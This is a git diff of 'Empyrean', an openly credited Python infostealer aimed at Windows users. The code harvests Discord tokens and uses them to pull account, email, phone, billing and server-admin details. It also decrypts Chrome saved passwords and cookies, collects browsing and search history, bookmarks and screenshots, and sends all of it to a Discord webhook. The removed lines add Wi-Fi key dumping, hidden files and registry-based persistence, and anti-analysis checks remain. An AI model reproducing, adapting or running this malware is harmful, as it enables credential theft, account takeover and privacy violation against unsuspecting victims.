@@ -2,84 +2,48 @@ import base64
 import ctypes
 import json
 import os
-import platform
+from random import SystemRandom
 import re
 import shutil
 import sqlite3
 import subprocess
-import sys
-import uuid
+from asyncio import subprocess
 
-import psutil
 import requests
 import wmi
 from Crypto.Cipher import AES
 from discord import Embed, File, RequestsWebhookAdapter, Webhook
 from PIL import ImageGrab
-from win32api import SetFileAttributes
-from win32con import FILE_ATTRIBUTE_HIDDEN
 from win32crypt import CryptUnprotectData
+from threading import Thread
 
-def main() -> None: 
-    config = {
-        "webhook": "WEBHOOK_URL",
-        "debug": True,
-        "startup": True,
-        "google": True,
-        "screenshot": True,
-        "inject": True,
-    }
-    webhook = config['webhook']
+def main() -> None:
+    webhook = "&WEBHOOK_URL&"
     
-    debug() if config["debug"] else None
-    cleanup()
+    threads = []
+    for operation in [discord, google]:
+        thread = Thread(target=operation, args=(webhook,))
+        thread.start()
+        threads.append(thread)
         
-    startup() if config["startup"] else None
-    injection(webhook=webhook) if config["inject"] else None
-    
-    webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
-    embed = Embed(title="\u200b", color=0x000000)
-    
-    token_grabber(embed=embed)
-    
-    systemspec.sys_spec()
-    if config["google"]:
-        google().grabPasswords()
-        google().grabCookies()
-        google().grabSearchHistory()
-        google().grabWebHistory()
-    image() if config["screenshot"] else None
-    
-    files = []
-    files.append(File(".\\chrome-passwords.txt") if os.path.exists(".\\chrome-passwords.txt") else None)
-    files.append(File(".\\chrome-cookies.txt") if os.path.exists(".\\chrome-cookies.txt") else None)
-    files.append(File(".\\chrome-search-history.txt") if os.path.exists(".\\chrome-search-history.txt") else None)
-    files.append(File(".\\chrome-web-history.txt") if os.path.exists(".\\chrome-web-history.txt") else None)
-    files.append(File(".\\screenshot.png") if os.path.exists(".\\screenshot.png") else None)
-    files.append(File(".\\system-spec.txt") if os.path.exists(".\\system-spec.txt") else None)
-    
-    embed.set_author(name="Empyrean", icon_url="https://i.imgur.com/ihzoAWl.jpeg")
-    embed.set_footer(text="Empyrean ❤ Made by https://github.com/addi00000")
-    
-    webhook.send(embed=embed, files=files, username="Empyrean", avatar_url="https://i.imgur.com/ihzoAWl.jpeg") if files != [None, None, None, None, None] else webhook.send(embed=embed, username="Empyrean", avatar_url="https://i.imgur.com/ihzoAWl.jpeg")
-    
-    cleanup()
-    
-class token_grabber():
-    def __init__(self, embed) -> None:
-        global tokens
+    for thread in threads:
+        thread.join()
         
+    system(webhook)
+
+class discord():
+    def __init__(self, webhook) -> None:
         self.baseurl = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
         self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
-
+        
         self.tokens = []
         self.ids = []
         
         self.grabTokens()
-        self.embed_accounts(embed)
+        self.upload_accounts(webhook)
     
     def calc_flags(self, flags: int) -> list:
         flags_dict = {
@@ -146,57 +110,63 @@ class token_grabber():
         }
 
         return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]
-
     
-    def embed_accounts(self, embed) -> None:
+    def upload_accounts(self, webhook) -> None:
+        webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
+            
         for token in self.tokens:
-            r = requests.get("https://discordapp.com/api/v6/users/@me", headers={
+            headers = {
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                 'Content-Type': 'application/json',
                 'Authorization': token,
-            })
-
-            username = r.json()['username'] + '#' + r.json()['discriminator']
-            user_id = r.json()['id']
-            email = r.json()['email']
-            phone = r.json()['phone']
-            badges = ' '.join([flag[0] for flag in self.calc_flags(r.json()['public_flags'])[::-1]])
-
-            try:
-                if r.json()['premium_type'] == 1:
-                    nitro = 'Nitro Classic'
-                elif r.json()['premium_type'] == 2:
-                    nitro = 'Nitro Boost'
-            except KeyError:
-                nitro = 'None'
-
-            b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers={
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
-                'Content-Type': 'application/json',
-                'Authorization': token,
-            })
+                }
+            
+            r = requests.get(self.baseurl, headers=headers).json()
+            b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers)
+                             
+            username = r["username"] + "#" + r["discriminator"]
+            userid = r["id"]
+            email = r["email"]
+            phone = r["phone"]
+            avatar = f"https://cdn.discordapp.com/avatars/{userid}/{r['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{userid}/{r['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{userid}/{r['avatar']}.png"
+            badges = ' '.join([flag[0] for flag in self.calc_flags(r['public_flags'])[::-1]])
+            
+            try: nitro = 'Nitro Classic' if r['premium_type'] == 1 else 'Nitro Boost'
+            except KeyError: nitro = 'None'
             
             if b.json() == []:
-                methods = "`None`"
+                methods = "None"
             else:
                 methods = ""
                 try:
                     for method in b.json():
-                        if method['type'] == 1:
+                        if method['type'] == 1: 
                             methods += "💳 "
-                        elif method['type'] == 2:
+                        elif method['type'] == 2: 
                             methods += "<:paypal:973417655627288666> "
-                        else:
+                        else: 
                             methods += "❓"
-                except TypeError:
+                except TypeError: 
                     methods += "❓"
+            
+            g = requests.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)
+            hq_guilds = ""
+            try:
+                for guild in g.json():
+                    admin = True if guild['permissions'] == '4398046511103' else False
+                    if admin and guild['approximate_member_count'] >= 100:
+                        i = requests.get(f"https://discord.com/api/v9/guilds/{guild['id']}/invites", headers=headers)
+                        owner = " ✅ " if guild['owner'] else "❌"
                         
-            f = requests.get("https://discordapp.com/api/v6/users/@me/relationships", headers={
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
-                'Content-Type': 'application/json',
-                'Authorization': token,
-            })
-   
+                        if len(i.json()) > 1:
+                            hq_guilds += f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join {guild['name']}](https://discord.com/invite/{i.json()[0]['code']})\n"
+                        else:
+                            hq_guilds += f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\nNo invite code could be found for this guild\n"
+            
+            except TypeError or KeyError:
+                pass            
+            
+            f = requests.get("https://discordapp.com/api/v6/users/@me/relationships", headers=headers)
             hq_friends = ""
             try:
                 for friend in f.json():
@@ -208,46 +178,27 @@ class token_grabber():
                         hq_friends += f"{hq_badges} - `{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})`\n"
             except TypeError:
                 pass
-                #hq_friends = "No HQ Friends Found"
-
-            g = requests.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers={
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
-                'Content-Type': 'application/json',
-                'Authorization': token,
-            })
             
-            hq_guilds = ""
-            try:
-                for guild in g.json():
-                    admin = True if guild['permissions'] == '4398046511103' else False
-                    if admin and guild['approximate_member_count'] >= 50:
-                        i = requests.get(f"https://discord.com/api/v9/guilds/{guild['id']}/invites", headers={
-                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
-                            'Content-Type': 'application/json',
-                            'Authorization': token,
-                        })
-
-                        if guild['owner']:
-                            owner = " ✅ "
-                        else:
-                            owner = "❌"
-
-                        if len(i.json()) > 1:
-                            hq_guilds += f"\u200b\n**{guild['name']} / ({guild['id']})** \n Owner: `{owner}` | Admin: ` ✅ ` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join {guild['name']}](https://discord.com/invite/{i.json()[0]['code']})\n"
-                        else:
-                            hq_guilds += f"\u200b\n**{guild['name']} / ({guild['id']})** \n Owner: `{owner}` | Admin: ` ✅ ` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\nNo invite code could be found for this guild\n"
+            embed = Embed(title=f"{username} ({userid})", color=0x000000)
+            embed.set_thumbnail(url=avatar)
+            embed.add_field(name="<a:pinkcrown:996004209667346442> Token:", value=f"```{token}```\n[Click to copy!](https://paste.addi00000.repl.co/?p={token})\n\u200b", inline=False)
+            embed.add_field(name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
+            embed.add_field(name="<a:redboost:996004230345281546> Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
+            embed.add_field(name="<a:pinklv:996004222090891366> Billing:", value=f"{methods if methods != '' else 'None'}", inline=True)
+            embed.add_field(name="<a:rainbowheart:996004226092245072> Email:", value=f"{email if email != None else 'None'}", inline=True)
+            embed.add_field(name="<:starxglow:996004217699434496> Phone:", value=f"{phone if phone != None else 'None'}", inline=True)
             
-            except TypeError or KeyError:
-                pass            
             
-            embed.add_field(name=f"**{username} ({user_id})**", value=f"```{token}```\n***Email >*** `{email}`\n***Phone >*** `{phone}`\n***Nitro >*** `{nitro}`\n***Billing >*** {methods}\n***Badges >*** {badges}\n\u200b", inline=False)
+            embed.add_field(name="\u200b", value=f"\u200b", inline=False) if hq_guilds != "" else None
+            if hq_guilds != "": embed.add_field(name="<a:earthpink:996004236531859588> HQ Guilds:", value=f"{hq_guilds}", inline=False)
+            embed.add_field(name="\u200b", value=f"\u200b", inline=False) if hq_friends != "" else None
+            if hq_friends != "": embed.add_field(name="<a:earthpink:996004236531859588> HQ Friends:", value=f"{hq_friends}", inline=False)
+            embed.add_field(name="\u200b", value=f"\u200b", inline=False) if hq_guilds or hq_friends != "" else None
             
-            if hq_friends != "":
-                embed.add_field(name="***HQ Friends >***", value=f"{hq_friends}\n\u200b", inline=False)
-                
-            if hq_guilds != "":
-                embed.add_field(name="***HQ Guilds >***", value=f"{hq_guilds}\n\u200b", inline=False)
-       
+            embed.set_footer(text="github.com/addi00000/empyrean")
+            
+            webhook.send(embed=embed, username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
+            
     def decrypt_val(self, buff, master_key) -> str:
         try:
             iv = buff[3:15]
@@ -366,8 +317,48 @@ class token_grabber():
                                 if uid not in self.ids:
                                     self.tokens.append(token)
                                     self.ids.append(uid)
-  
+                                    
 class google():
+    def __init__(self, webhook: str) -> None:
+        webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
+        
+        self.appdata = os.getenv('LOCALAPPDATA')
+        self.databases = {
+            self.appdata + '\\Google\\Chrome\\User Data\\Default',
+            self.appdata + '\\Google\\Chrome\\User Data\\Profile 1',
+            self.appdata + '\\Google\\Chrome\\User Data\\Profile 2',
+            self.appdata + '\\Google\\Chrome\\User Data\\Profile 3',
+            self.appdata + '\\Google\\Chrome\\User Data\\Profile 4',
+            self.appdata + '\\Google\\Chrome\\User Data\\Profile 5',
+        }
+        self.masterkey = self.get_master_key(self.appdata+'\\Google\\Chrome\\User Data\\Local State')
+        self.files = [
+            '.\\google-passwords.txt',
+            '.\\google-cookies.txt',
+            '.\\google-web-history.txt',
+            '.\\google-search-history.txt',
+            '.\\google-bookmarks.txt',
+        ]
+        
+        self.password()
+        self.cookies()
+        self.web_history()
+        self.search_history()
+        self.bookmarks()
+        
+        for file in self.files:
+            if not os.path.isfile(file):
+                continue
+            
+            if os.path.getsize(file) > 8000000:
+                continue
+            
+            webhook.send(file=File(file), username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
+        
+        for file in self.files:
+            if os.path.isfile(file):
+                os.remove(file)
+        
     def get_master_key(self, path) -> str:
         with open(path, "r", encoding="utf-8") as f:
             c = f.read()
@@ -388,305 +379,137 @@ class google():
             return decrypted_pass
         except:
             return "Chrome < 80"
-    
-    def grabPasswords(self):
-        appdata = os.getenv("localappdata")
         
-        if os.path.exists('.\\chrome-passwords.txt'): os.remove('.\\chrome-passwords.txt')
-        with open('.\\chrome-passwords.txt', 'w') as f:  f.write('Empyrean /// Google Chrome Passwords\n\n\n')
-        hide('.\\chrome-passwords.txt')
-        if not os.path.exists(appdata+'\\Google'): return []
-        
-        passwords = []
-        master_key = self.get_master_key(appdata+'\\Google\\Chrome\\User Data\\Local State')
-        
-        login_dbs = [
-            appdata + '\\Google\\Chrome\\User Data\\Default\\Login Data',
-            appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Login Data',
-            appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Login Data',
-            appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Login Data',
-            appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Login Data',
-            appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Login Data',
-        ]      
-            
-        used_login_dbs = []
-        
-        for login_db in login_dbs:
-            if os.path.exists(login_db): 
-                used_login_dbs.append(login_db)
-            else:
+    def password(self):
+        for path in self.databases:
+            path += "\\Login Data"
+            if not os.path.exists(path):
                 continue
-            
-            try: shutil.copy2(login_db, "Loginvault.db")
-            except FileNotFoundError: return []
-            
-            conn = sqlite3.connect("Loginvault.db"); cursor = conn.cursor()
-
-            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-            with open('.\\chrome-passwords.txt', 'a') as f:
-                for r in cursor.fetchall():
-                    url = r[0]
-                    username = r[1]
-                    encrypted_password = r[2]
-                    decrypted_password = self.decrypt_password(encrypted_password, master_key)
-                    if url != "" and username != "" and decrypted_password != "":
-                        passwords.append(f'URL: {url}\nUser: {username}\nPassword: {decrypted_password}\n\n')
-                f.write('\n'.join(passwords))
-                
-            cursor.close(); conn.close()
-            os.remove("Loginvault.db")
-        
-        return passwords
-
-    def grabCookies(self):
-        appdata = os.getenv("localappdata")
-        
-        if os.path.exists('.\\chrome-cookies.txt'): os.remove('.\\chrome-cookies.txt')
-        with open('.\\chrome-cookies.txt', 'w') as f: f.write('Empyrean /// Google Chrome Cookies\n\n\n')
-        hide('.\\chrome-cookies.txt')
-        if not os.path.exists(appdata+'\\Google'): return []
-
-        cookies = []
-        master_key = self.get_master_key(appdata+'\\Google\\Chrome\\User Data\\Local State')
-        
-        login_dbs = [
-            appdata + '\\Google\\Chrome\\User Data\\Default\\Network\\cookies',
-            appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\cookies',
-            appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\cookies',
-            appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\cookies',
-            appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\cookies',
-            appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\cookies',
-        ] 
-        
-        used_login_dbs = []
-        
-        for login_db in login_dbs:
-            if os.path.exists(login_db): 
-                used_login_dbs.append(login_db)
-            else:
-                continue
-            
-            try: shutil.copy2(login_db, "Loginvault.db")
-            except FileNotFoundError: return []
-            
-            conn = sqlite3.connect("Loginvault.db"); cursor = conn.cursor()
-            
-            cursor.execute("SELECT host_key, name, encrypted_value from cookies")
-            with open('.\\chrome-cookies.txt', 'a') as f:
-                for r in cursor.fetchall():
-                    host = r[0]
-                    user = r[1]
-                    decrypted_cookie = self.decrypt_password(r[2], master_key)
-                    if host != "":
-                        cookies.append(f'Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n')
-                f.write('\n'.join(cookies))
-        
-            cursor.close(); conn.close()
-            os.remove("Loginvault.db")	
-    
-        return cookies
-     
-    def grabSearchHistory(self):
-        appdata = os.getenv("localappdata")
-        
-        if os.path.exists('.\\chrome-search-history.txt'): os.remove('.\\chrome-search-history.txt')
-        with open('.\\chrome-search-history.txt', 'w', encoding='utf-8') as f: f.write('Empyrean /// Google Chrome Search History\n\n\n')
-        hide('.\\chrome-search-history.txt')
-        if not os.path.exists(appdata+'\\Google'): return []
-
-        search_history = []
-        
-        login_dbs = [
-            appdata + '\\Google\\Chrome\\User Data\\Default\\History',
-            appdata + '\\Google\\Chrome\\User Data\\Profile 1\\History',
-            appdata + '\\Google\\Chrome\\User Data\\Profile 2\\History',
-            appdata + '\\Google\\Chrome\\User Data\\Profile 3\\History',
-            appdata + '\\Google\\Chrome\\User Data\\Profile 4\\History',
-            appdata + '\\Google\\Chrome\\User Data\\Profile 5\\History',
-        ] 
-        
-        used_login_dbs = []
-        
-        for login_db in login_dbs:
-            if os.path.exists(login_db): 
-                used_login_dbs.append(login_db)
-            else:
-                continue
-            
-            try: shutil.copy2(login_db, "Loginvault.db")
-            except FileNotFoundError: return []
-            
-            conn = sqlite3.connect("Loginvault.db"); cursor = conn.cursor()
-
-            cursor.execute("""SELECT term FROM keyword_search_terms""")
-            with open('.\\chrome-search-history.txt', 'a', encoding='utf-8') as f:
-                terms = []
-                for r in cursor.fetchall():
-                    if r[0] not in terms and r[0] != "":
-                        terms.append(r[0])
-                f.write('\n'.join(terms))
-            
-            cursor.close(); conn.close()
+            shutil.copy2(path, "Loginvault.db")
+            conn = sqlite3.connect("Loginvault.db")
+            cursor = conn.cursor()
+            with open('google-passwords.txt', 'a', encoding='utf-8') as f:
+                for res in cursor.execute("SELECT action_url, username_value, password_value FROM logins").fetchall():
+                    url, username, password = res
+                    password = self.decrypt_password(password, self.masterkey)
+                    if url != "" and username != "" and password != "":
+                        f.write("Username: {:<40} Password: {:<40} URL: {}\n".format(username, password, url))
+            cursor.close()
+            conn.close()
             os.remove("Loginvault.db")
             
-        return search_history
-    
-    def grabWebHistory(self):
-        appdata = os.getenv("localappdata")
-        
-        if os.path.exists('.\\chrome-web-history.txt'): os.remove('.\\chrome-web-history.txt')
-        with open('.\\chrome-web-history.txt', 'w', encoding='utf-8') as f: f.write('Empyrean /// Google Chrome Web History\n\n\n')
-        hide('.\\chrome-web-history.txt')
-        if not os.path.exists(appdata+'\\Google'): return []
-
-        web_history = []
-        
-        login_dbs = [
-            appdata + '\\Google\\Chrome\\User Data\\Default\\History',
-            appdata + '\\Google\\Chrome\\User Data\\Profile 1\\History',
-            appdata + '\\Google\\Chrome\\User Data\\Profile 2\\History',
-            appdata + '\\Google\\Chrome\\User Data\\Profile 3\\History',
-            appdata + '\\Google\\Chrome\\User Data\\Profile 4\\History',
-            appdata + '\\Google\\Chrome\\User Data\\Profile 5\\History',
-        ] 
-        
-        used_login_dbs = []
-        
-        for login_db in login_dbs:
-            if os.path.exists(login_db): 
-                used_login_dbs.append(login_db)
-            else:
+    def cookies(self):
+        for path in self.databases:
+            path += "\\Network\\Cookies"
+            if not os.path.exists(path):
                 continue
-            
-            try: shutil.copy2(login_db, "Loginvault.db")
-            except FileNotFoundError: return []
-            
-            conn = sqlite3.connect("Loginvault.db"); cursor = conn.cursor()
-
-            cursor.execute("""SELECT url, title, datetime((last_visit_time/1000000)-11644473600, 'unixepoch', 'localtime') 
-                                    AS last_visit_time FROM urls ORDER BY last_visit_time DESC""")
-            with open('.\\chrome-web-history.txt', 'a', encoding='utf-8') as f:
-                terms = []
-                for r in cursor.fetchall():
-                    if r[0] not in terms and r[0] != "":
-                        terms.append(r[0])
-                f.write('\n'.join(terms))
-            
-            cursor.close(); conn.close()
+            shutil.copy2(path, "Loginvault.db")
+            conn = sqlite3.connect("Loginvault.db")
+            cursor = conn.cursor()
+            with open('google-cookies.txt', 'a', encoding='utf-8') as f:
+                for res in cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies").fetchall():
+                    host, name, value, encrypted_value = res
+                    value = self.decrypt_password(encrypted_value, self.masterkey)
+                    if host != "" and name != "" and value != "":
+                        f.write("Host: {:<40} Name: {:<40} Value: {}\n".format(host, name, value))
+                      
+            cursor.close()
+            conn.close()
+            os.remove("Loginvault.db") 
+      
+    def web_history(self):
+        for path in self.databases:
+            path += "\\History"
+            if not os.path.exists(path):
+                continue
+            shutil.copy2(path, "Loginvault.db")
+            conn = sqlite3.connect("Loginvault.db")
+            cursor = conn.cursor()
+            with open('google-web-history.txt', 'a', encoding='utf-8') as f:
+                sites = []
+                for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
+                    url, title, visit_count, last_visit_time = res
+                    if url != "" and title != "" and visit_count != "" and last_visit_time != "":
+                        sites.append((url, title, visit_count, last_visit_time))
+                        
+                sites.sort(key=lambda x: x[3], reverse=True)
+                for site in sites:
+                    f.write("Visit Count: {:<6} Title: {:<40}\n".format(site[2], site[1]))
+                    
+            cursor.close()
+            conn.close()
+            os.remove("Loginvault.db")
+                 
+    def search_history(self):
+        for path in self.databases:
+            path += "\\History"
+            if not os.path.exists(path):
+                continue
+            shutil.copy2(path, "Loginvault.db")
+            conn = sqlite3.connect("Loginvault.db")
+            cursor = conn.cursor()
+            with open('google-search-history.txt', 'a', encoding='utf-8') as f:
+                for res in cursor.execute("SELECT term FROM keyword_search_terms").fetchall():
+                    term = res[0]
+                    if term != "":
+                        f.write("Search: {}\n".format(term))
+            cursor.close()
+            conn.close()
             os.remove("Loginvault.db")
             
-        return web_history
-class systemspec():
-    def sys_spec():
-        sys_spec = f"""
-Hostname: {systemspec.personal_info()[0]}
-Username: {systemspec.personal_info()[1]}
-Full Name: {systemspec.personal_info()[2]}
+    def bookmarks(self):
+        for path in self.databases:
+            path += "\\Bookmarks"
+            if not os.path.exists(path):
+                continue
+            shutil.copy2(path, "bookmarks.json")
+            with open('bookmarks.json', 'r', encoding='utf-8') as f:
+                for item in json.loads(f.read())['roots']['bookmark_bar']['children']:
+                    if 'children' in item:
+                        for child in item['children']:
+                            if 'url' in child:
+                                with open('google-bookmarks.txt', 'a', encoding='utf-8') as f:
+                                    f.write("URL: {}\n".format(child['url']))
+                    elif 'url' in item:
+                        with open('google-bookmarks.txt', 'a', encoding='utf-8') as f:
+                            f.write("URL: {}\n".format(item['url']))
+            os.remove('bookmarks.json')
 
-Operating System: {systemspec.platform_info()[0]}
-Release: {systemspec.platform_info()[1]}
-Version: {systemspec.platform_info()[2]}
-Architecture: {systemspec.platform_info()[3]}
+    def autofill(self):
+        for path in self.databases:
+            path += "\\autofill"
 
-Wifi: 
-------------------------------
-{systemspec.network_info()[0]}
-------------------------------
-
-IP Address: {systemspec.network_info()[1]}
-Mac Address: {systemspec.network_info()[2]}
-
-CPU: {systemspec.system_specs()[0].Name}
-GPU: {systemspec.system_specs()[1].Name}
-RAM: {round(systemspec.system_specs()[2], 0)} GB
-
-Disk: 
-------------------------------
-{systemspec.system_specs()[3]}
-------------------------------
-"""     
-
-        os.remove('.\\system-spec.txt') if os.path.exists('.\\system-spec.txt') else None
-        with open('.\\system-spec.txt', 'w', encoding='utf-8') as f: f.write(sys_spec)
-        hide('.\\system-spec.txt')
+class system():
+    def __init__(self, webhook: str) -> None:
+        webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
+        embed = Embed(title="System Information", color=0x000000)
         
-    def personal_info():
-        def get_display_name():
-            GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
-            NameDisplay = 3
+        embed.add_field(name="Display Name", value=self.get_display_name(), inline=True)
+        embed.add_field(name="Hostname", value=os.getenv("COMPUTERNAME"), inline=True)
+        embed.add_field(name="Username", value=os.getenv("USERNAME"), inline=True)
         
-            size = ctypes.pointer(ctypes.c_ulong(0))
-            GetUserNameEx(NameDisplay, None, size)
+        embed.add_field(name="CPU", value=wmi.WMI().Win32_Processor()[0].Name, inline=True)
+        embed.add_field(name="GPU", value=wmi.WMI().Win32_VideoController()[0].Name, inline=True)
+        embed.add_field(name="RAM", value=round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0), inline=True)
         
-            nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
-            GetUserNameEx(NameDisplay, nameBuffer, size)
-            return nameBuffer.value
+        ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None).save("screenshot.png")
+        embed.set_image(url="attachment://screenshot.png")
         
-        hostname = os.getenv("COMPUTERNAME")
-        username = os.getenv("USERNAME")
-        displayname = get_display_name()
+        webhook.send(embed=embed, file=File('.\\screenshot.png', filename='screenshot.png'), username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
         
-        return hostname, username, displayname
+        if os.path.exists("screenshot.png"):
+            os.remove("screenshot.png")
         
-    def platform_info():
-        operating_sys = platform.system()
-        os_release = platform.release()
-        os_version = platform.version()
-        architecture = platform.architecture()
-        
-        return operating_sys, os_release, os_version, architecture
+    def get_display_name(self):
+        GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
+        NameDisplay = 3
     
-    def network_info():
-        wifi = ""
-        data = subprocess.Popen(['netsh', 'wlan', 'show', 'profiles'], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read().decode('utf-8', errors="backslashreplace").split('\n')
-        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
-        for i in profiles:
-            try:
-                results = subprocess.Popen(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.read().decode('utf-8', errors="backslashreplace").split('\n')
-                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
-                try: wifi += "{:<20} $ {}".format(i, results[0]) + "\n"
-                except IndexError: wifi += "{:<20} $ *No Password*".format(i) + "\n"
-            except subprocess.CalledProcessError: wifi += "{:<20} $ *No Password*".format(i) + "\n"
-                
-        ip_address = requests.get('https://api.ipify.org').text
-        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-
-        return wifi, ip_address, mac_address
+        size = ctypes.pointer(ctypes.c_ulong(0))
+        GetUserNameEx(NameDisplay, None, size)
     
-    def system_specs():
-        cpu = wmi.WMI().Win32_Processor()[0]
-        gpu = wmi.WMI().Win32_VideoController()[0]
-        ram = float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576
-        
-        disk = ("{:<9} "*5).format("Drive", "Used GB", "Free GB", "Total GB", "Use%") + "\n"
-        for part in psutil.disk_partitions(all=False):
-            if os.name == 'nt':
-                if 'cdrom' in part.opts or part.fstype == '': continue
-            usage = psutil.disk_usage(part.mountpoint)
-            disk += ("{:<9} "*5).format(part.device, f"{usage.used/float(1<<30):,.0f}", f"{usage.free/float(1<<30):,.0f}", f"{usage.total/float(1<<30):,.0f}", usage.percent) + "\n"
-        
-        return cpu, gpu, ram, disk
-
-def image():
-    os.remove('.\\screenshot.png') if os.path.exists('.\\screenshot.png') else None
-    ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None).save('.\\screenshot.png', 'PNG')
-    hide('screenshot.png')
-    
-def hide(file):
-    SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)
-
-def cleanup():
-    possible_files = [
-        '.\\chrome-passwords.txt',
-        '.\\chrome-cookies.txt',
-        '.\\chrome-search-history.txt',
-        '.\\chrome-web-history.txt',
-        '.\\screenshot.png',
-        '.\\system-spec.txt',
-    ]
-    for file in possible_files:
-        if os.path.exists(file):
-            os.remove(file)
+        nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
+        GetUserNameEx(NameDisplay, nameBuffer, size)
+        return nameBuffer.value
 
 class injection:
     def __init__(self, webhook: str):
@@ -733,7 +556,7 @@ class injection:
                         if file == executable:
                             executable = app + '\\' + executable
                             subprocess.call([update, '--processStart', executable], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-     
+                            
 class debug:
     def __init__(self):
         if self.checks(): self.self_destruct()
@@ -779,44 +602,7 @@ class debug:
         if hostname in self.blackListedPCNames: return True
     
     def self_destruct(self):
-        sys.exit()
-
-class startup():
-    def __init__(self):
-        if not self.check(): return
-    
-        self.Empyrean_dir = self.mk_appdata()
-        self.mv_self()
-        self.reg_add()
-    
-    def check(self):
-        if os.path.splitext(__file__)[1] == ".exe":
-            return True
-        else:
-            return False
-    
-    def mk_appdata(self):
-        roaming = os.getenv("APPDATA")
-        
-        shutil.rmtree(roaming + "\\" + "Empyrean") if os.path.exists(roaming + "\\" + "Empyrean") else None
-        
-        os.mkdir(roaming + "\\" + "Empyrean")
-        
-        Empyrean_dir = roaming + "\\" + "Empyrean" if os.path.exists(roaming + "\\" + "Empyrean") else None
-            
-        return Empyrean_dir
-    
-    def mv_self(self):
-        shutil.copy2(__file__, self.Empyrean_dir + "\\" + os.path.basename(__file__))
-
-    def reg_add(self):
-        subprocess.call(["reg", "delete", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Empyrean", "/f"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        subprocess.call(["reg", "add", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Empyrean", "/t", "REG_SZ", "/d", self.Empyrean_dir + "\\" + os.path.basename(__file__)], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        sys.exit()        
 
